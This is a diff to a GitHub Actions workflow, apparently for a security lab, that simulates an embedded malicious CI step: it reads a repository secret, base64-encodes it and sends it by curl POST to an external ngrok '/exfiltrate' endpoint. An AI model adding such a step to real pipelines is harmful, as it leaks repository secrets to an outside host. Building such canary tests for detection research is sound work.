@@ -8,12 +8,12 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Simulate Embedded Payload (A1b)
+      - name: Simulate Embedded Malicious Step (A1b)
+        env:
+          LAB_CANARY: ${{ secrets.LAB_CANARY }}
         run: |
-          CANARY="canary-secret-$(openssl rand -hex 8)"
-          echo "Simulating credential/canary exfiltration..."
-          
-          # Send the canary and GitHub run ID to your listener via ngrok
+          echo "Simulating exfiltration of repository secret via embedded payload..."
+          ENCODED_SECRET=$(echo -n "$LAB_CANARY" | base64)
           curl -X POST https://shortage-euphemism-gleeful.ngrok-free.dev/exfiltrate \
             -H "Content-Type: application/json" \
-            -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$CANARY\", \"scenario\": \"A1b\"}"
+            -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$ENCODED_SECRET\", \"scenario\": \"A1b\"}"
